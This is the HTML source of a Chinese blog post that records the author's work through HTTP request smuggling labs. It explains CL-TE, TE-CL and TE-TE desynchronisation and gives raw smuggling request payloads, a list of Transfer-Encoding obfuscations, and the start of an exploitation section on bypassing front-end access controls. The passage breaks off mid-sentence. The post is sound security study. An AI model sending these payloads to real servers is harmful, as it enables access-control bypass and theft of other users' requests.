@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>HTTP请求走私的学习 - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="Share learn & Share life.">
+
+
+
+<meta name="keywords" content="Threezh1">
+
+
+
+    <meta name="description" content="&amp;#x8FD9;&amp;#x6B21;&amp;#x5728;DEFCON&amp;#x4E0A;&amp;#x9047;&amp;#x5230;&amp;#x4E00;&amp;#x9053;&amp;#x5173;&amp;#x4E8E;HTTP&amp;#x8D70;&amp;#x79C1;&amp;#xFF08;HTTP request smuggling&amp;#xFF09;&amp;#x7684;&amp;#x9898;&amp;#xFF0C;&amp;#x81EA;&amp;#x5DF1;&amp;#x53C8;&amp;#x4E00;">
+<meta name="keywords" content="HTTP请求走私">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP请求走私的学习">
+<meta property="og:url" content="http://yoursite.com/2020/05/20/HTTP请求走私的学习/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="&amp;#x8FD9;&amp;#x6B21;&amp;#x5728;DEFCON&amp;#x4E0A;&amp;#x9047;&amp;#x5230;&amp;#x4E00;&amp;#x9053;&amp;#x5173;&amp;#x4E8E;HTTP&amp;#x8D70;&amp;#x79C1;&amp;#xFF08;HTTP request smuggling&amp;#xFF09;&amp;#x7684;&amp;#x9898;&amp;#xFF0C;&amp;#x81EA;&amp;#x5DF1;&amp;#x53C8;&amp;#x4E00;">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/bwX9kRqDACEZMGN.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/RKO2LufhQGv8myo.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/Z8KaM7goOnX4Ftk.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/ps5qgLDe9KN4Zif.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/8XtG4iShFw9uo3l.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/iB5KPhJGnqUOIVW.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/bGAnEVqfoJvw6tj.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/fdsCv4pHk2XebWl.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/4bl1GDnrgU2dAc3.png">
+<meta property="og:image" content="https://i.loli.net/2020/05/20/cePvXkO7nTWGA3p.png">
+<meta property="og:updated_time" content="2020-05-20T08:29:32.851Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTTP请求走私的学习">
+<meta name="twitter:description" content="&amp;#x8FD9;&amp;#x6B21;&amp;#x5728;DEFCON&amp;#x4E0A;&amp;#x9047;&amp;#x5230;&amp;#x4E00;&amp;#x9053;&amp;#x5173;&amp;#x4E8E;HTTP&amp;#x8D70;&amp;#x79C1;&amp;#xFF08;HTTP request smuggling&amp;#xFF09;&amp;#x7684;&amp;#x9898;&amp;#xFF0C;&amp;#x81EA;&amp;#x5DF1;&amp;#x53C8;&amp;#x4E00;">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/20/bwX9kRqDACEZMGN.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+</head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/about">关于</a>
+            
+            <a class="navbar-item " href="http://121.36.32.184/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Suche" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Inhaltsverzeichnis">
+                    <i class="fa fa-list"></i>
+                </a>
+                <div class="navbar-dropdown is-right">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#HTTP-request-smuggling">1&nbsp;&nbsp;<b>HTTP request smuggling</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#几种不同的走私类型">1.1&nbsp;&nbsp;几种不同的走私类型</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#CL-TE">1.2&nbsp;&nbsp;CL-TE</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#TE-CL">1.3&nbsp;&nbsp;TE-CL</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#TE-TE">1.4&nbsp;&nbsp;TE-TE</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#利用HTTP请求走私漏洞">2&nbsp;&nbsp;<b>利用HTTP请求走私漏洞</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Bypass前端服务器安全验证">2.1&nbsp;&nbsp;Bypass前端服务器安全验证</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#获取前端服务器对请求的重写情况">2.2&nbsp;&nbsp;获取前端服务器对请求的重写情况</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#获取其他用户的Cookie">2.3&nbsp;&nbsp;获取其他用户的Cookie</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#HTTP-HEADER导致的XSS">2.4&nbsp;&nbsp;HTTP HEADER导致的XSS</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#HTTP请求走私-缓存投毒-缓存欺骗">2.5&nbsp;&nbsp;HTTP请求走私 + 缓存投毒 + 缓存欺骗</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#说在后面">3&nbsp;&nbsp;<b>说在后面</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            HTTP请求走私的学习
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-05-20T08:29:08.000Z" itemprop="datePublished">May 20 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            13 minutes lesen (Über 1983 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>&#x8FD9;&#x6B21;&#x5728;DEFCON&#x4E0A;&#x9047;&#x5230;&#x4E00;&#x9053;&#x5173;&#x4E8E;HTTP&#x8D70;&#x79C1;&#xFF08;HTTP request smuggling&#xFF09;&#x7684;&#x9898;&#xFF0C;&#x81EA;&#x5DF1;&#x53C8;&#x4E00;&#x76F4;&#x6CA1;&#x6709;&#x6574;&#x7406;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5C31;&#x82B1;&#x4E86;&#x4E00;&#x4E24;&#x5929;&#x7684;&#x65F6;&#x95F4;&#x628A;Brupsuite&#x793E;&#x533A;&#x4E0A;&#x7684;&#x5B9E;&#x9A8C;&#x90FD;&#x505A;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x3002;</p>
+<h2 id="HTTP-request-smuggling"><a href="#HTTP-request-smuggling" class="headerlink" title="HTTP request smuggling"></a>HTTP request smuggling</h2><p>&#x5EFA;&#x8BAE;&#x9605;&#x8BFB;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p>
+<p>&#x5F53;&#x7F51;&#x7AD9;&#x4F7F;&#x7528;&#x4E24;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x4E00;&#x4E2A;&#x524D;&#x7AEF;&#xFF0C;&#x4E00;&#x4E2A;&#x540E;&#x7AEF;&#xFF09;&#x6765;&#x5904;&#x7406;&#x7528;&#x6237;&#x6240;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x4E24;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x5BF9;HTTP HEADER&#x7684;&#x5904;&#x7406;&#x4E0D;&#x4E00;&#x81F4;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x4EA7;&#x751F;HTTP&#x8D70;&#x79C1;&#x95EE;&#x9898;&#x3002;&#x6BD4;&#x5982;&#x6587;&#x7AE0;&#x5F53;&#x4E2D;&#x6240;&#x63CF;&#x8FF0;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#xFF1A;</p>
+<blockquote>
+<p>&#x73B0;&#x5728;&#x7684;Web&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7ECF;&#x5E38;&#x5728;&#x7528;&#x6237;&#x548C;&#x6700;&#x7EC8;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;HTTP&#x670D;&#x52A1;&#x5668;&#x94FE;&#x3002;&#x7528;&#x6237;&#x5C06;&#x8BF7;&#x6C42;&#x53D1;&#x9001;&#x5230;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x6709;&#x65F6;&#x79F0;&#x4E3A;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x5668;&#x6216;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x8BE5;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x5230;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x3002;</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/05/20/bwX9kRqDACEZMGN.png" alt="Untitled.png"><br><a id="more"></a></p>
+<h3 id="&#x51E0;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x8D70;&#x79C1;&#x7C7B;&#x578B;"><a href="#&#x51E0;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x8D70;&#x79C1;&#x7C7B;&#x578B;" class="headerlink" title="&#x51E0;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x8D70;&#x79C1;&#x7C7B;&#x578B;"></a>&#x51E0;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x8D70;&#x79C1;&#x7C7B;&#x578B;</h3><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;Content-Length&#x5934;&#xFF0C;&#x800C;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;Transfer-Encoding&#x5934;&#x3002;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7B80;&#x5355;&#x7684;HTTP&#x8BF7;&#x6C42;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x8D70;&#x79C1;&#x95EE;&#x9898;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p>&#x5F53;&#x7B2C;&#x4E8C;&#x6B21;&#x8BF7;&#x6C42;&#x65F6;&#x51FA;&#x73B0;HTTP&#x65B9;&#x5F0F;&#x9519;&#x8BEF;&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x8D70;&#x79C1;&#x95EE;&#x9898;&#x3002;&#x5B9E;&#x9A8C;&#x622A;&#x56FE;&#xFF1A;</p>
+<p><img src="https://i.loli.net/2020/05/20/RKO2LufhQGv8myo.png" alt="Untitled 1.png"></p>
+<p>&#x5E38;&#x89C1;&#x60C5;&#x51B5;&#x4E2D;&#x662F;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;HTTP&#x65B9;&#x5F0F;&#x9519;&#x8BEF;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;CL-TE&#x7C7B;&#x578B;&#x7684;&#x8D70;&#x79C1;&#x95EE;&#x9898;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+
+<p>&#x5982;&#x679C;&#x5B58;&#x5728;&#x8D70;&#x79C1;&#x95EE;&#x9898;&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5C31;&#x4F1A;&#x6709;&#x660E;&#x663E;&#x7684;&#x5EF6;&#x8FDF;&#x3002;</p>
+<p>&#x6216;&#x8005;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;payload&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#x8D70;&#x79C1;&#x95EE;&#x9898;&#xFF0C;&#x5219;&#x4F1A;&#x8FD4;&#x56DE;&#x9519;&#x8BEF;&#x7684;&#x9875;&#x9762;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 50</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">q=smuggling&amp;x=</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/20/Z8KaM7goOnX4Ftk.png" alt="Untitled 2.png"></p>
+<ul>
+<li>&#x5B9E;&#x9A8C;&#x4E2D;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;</li>
+</ul>
+<p>&#x7531;&#x4E8E;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;Content-Length&#xFF0C;&#x9700;&#x8981;&#x628A;&#x6211;&#x4EEC;&#x6240;&#x6709;&#x7684;&#x5185;&#x5BB9;&#x90FD;&#x53D1;&#x9001;&#x5230;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x53BB;&#xFF0C;&#x90A3;&#x8FD9;&#x4E2A;Content-Length&#x53EF;&#x4EE5;&#x7528;Brupsuite&#x81EA;&#x52A8;&#x8BA1;&#x7B97;&#x3002;&#x7528;<code>&#x6362;&#x884C;0&#x6362;&#x884C;</code>&#x6765;&#x5206;&#x6BB5;&#x5373;&#x53EF;&#x3002;</p>
+<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;Transfer-Encoding&#x5934;&#xFF0C;&#x800C;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;Content-Length&#x5934;&#x3002;</p>
+<ul>
+<li>&#x7B80;&#x5355;&#x5224;&#x65AD;payload</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;&#x5224;&#x65AD;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x54CD;&#x5E94;&#x5DEE;&#x5F02;&#x5224;&#x65AD;</li>
+</ul>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">7c</span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 144</span><br><span class="line"></span><br><span class="line">x=</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/05/20/ps5qgLDe9KN4Zif.png" alt="Untitled 3.png"></p>
+<ul>
+<li>&#x5B9E;&#x9A8C;&#x4E2D;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;</li>
+</ul>
+<p>&#x53EF;&#x4EE5;&#x5148;&#x6784;&#x9020;&#x597D;&#x8BF7;&#x6C42;&#x5934;&#xFF0C;&#x4E4B;&#x540E;&#x7528;Brupsuite&#x7684;HTTP&#x8D70;&#x79C1;&#x63D2;&#x4EF6;&#x6765;&#x751F;&#x6210;Chunk&#xFF0C;Content-Length&#x7684;&#x81EA;&#x52A8;&#x8BA1;&#x7B97;&#x5173;&#x95ED;&#xFF0C;&#x586B;&#x5165;4&#xFF08;&#x524D;&#x9762;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x7684;&#x5B57;&#x8282;&#x957F;&#x5EA6;&#xFF09;&#x5373;&#x53EF;&#x3002;</p>
+<p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x8D70;&#x79C1;&#x7684;&#x8BF7;&#x6C42;&#x4E2D;&#xFF0C;Content-Length&#x4E00;&#x5B9A;&#x8981;&#x5C11;&#x4E8E;&#x540E;&#x9762;&#x8BF7;&#x6C42;&#x4E2D;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x5426;&#x5219;&#x540E;&#x53F0;&#x4F1A;Timeout&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#x3002;</p>
+<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x5C11;&#xFF0C;&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#xFF1A;</p>
+<p>&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x548C;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x652F;&#x6301;Transfer-Encoding&#x6807;&#x5934;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x67D0;&#x79CD;&#x65B9;&#x5F0F;&#x6DF7;&#x6DC6;&#x6807;&#x5934;&#x6765;&#x8BF1;&#x5BFC;&#x5176;&#x4E2D;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;</p>
+<p>&#x6DF7;&#x6DC6;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
+
+<p>TE.TE&#x7684;&#x5B9E;&#x9A8C;&#x7684;pyload&#xFF08;&#x505A;&#x5B8C;&#x5FD8;&#x8BB0;&#x622A;&#x56FE;&#x4E86;&#xFF09;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<h2 id="&#x5229;&#x7528;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x6F0F;&#x6D1E;"><a href="#&#x5229;&#x7528;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x5229;&#x7528;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x6F0F;&#x6D1E;"></a>&#x5229;&#x7528;HTTP&#x8BF7;&#x6C42;&#x8D70;&#x79C1;&#x6F0F;&#x6D1E;</h2><p>&#x5EFA;&#x8BAE;&#x9605;&#x8BFB;&#xFF1A;<a href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">Exploiting HTTP request smuggling vulnerabilities</a></p>
+<h3 id="Bypass&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5B89;&#x5168;&#x9A8C;&#x8BC1;"><a href="#Bypass&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5B89;&#x5168;&#x9A8C;&#x8BC1;" class="headerlink" title="Bypass&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5B89;&#x5168;&#x9A8C;&#x8BC1;"></a>Bypass&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5B89;&#x5168;&#x9A8C;&#x8BC1;</h3><p>&#x5F53;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x67D0;&#x4E9B;&#x9875;&#x9762;&#x6DFB;&#x52A0;&#x4E86;&#x8BBF;&#x95EE;&#x9650;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x5B9E;&#x9A8C;&#x4E2D;&#x5BF9;admin&#x9875;&#x9762;&#x63A7;&#x5236;&#x5728;&#x53EA;&#x80FD;&#x662F;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x624D;&#x80FD;&#x8BBF;&#x95EE;&#x3002;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;HTTP&#x8D70;&#x79C1;&#x6F0F;&#x6D1E;&#x6765;&#x7ED5;&#x8FC7;&#x8FD9;&#x4E2A;&#x9650;&#x5236;&#xFF1A;</p>
+<ul>
+<li>CL.TE</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/8XtG4iShFw9uo3l.png" alt="Untitled 4.png"></p>
+<ul>
+<li>TE.CL</li>
+</ul>
+<p><img src="https://i.loli.net/2020/05/20/iB5KPhJGnqUOIVW.png" alt="Untitled 5.png"></p>
+<h3 id="&#x83B7;&#x53D6;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8BF7;&#x6C42;&#x7684;&#x91CD;&#x5199;&#x60C5;&#x51B5;"><a href="#&#x83B7;&#x53D6;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8BF7;&#x6C42;&#x7684;&#x91CD;&#x5199;&#x60C5;&#x51B5;" class="headerlink" title="&#x83B7;&#x53D6;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8BF7;&#x6C42;&#x7684;&#x91CD;&#x5199;&#x60C5;&#x51B5;"></a>&#x83B7;&#x53D6;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x8BF7;&#x6C42;&#x7684;&#x91CD;&#x5199;&#x60C5;&#x51B5;</h3><p>&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x901A;&#x5E38;&#x5728;&#x8BF7;&#x6C42;&#x6DFB;&#x52A0;&#x5230;&#x5176;&#x4ED6;&#x8BF7;&#x6C42;&#x5934;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x5BF9;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x91CD;&#x5199;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8F6C;&#x53D1;&#x7ED9;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x3002;&#x4E00;&#x822C;&#x662F;&#x6DFB;&#x52A0;&#x4E00;&#x4E9B;HTTP 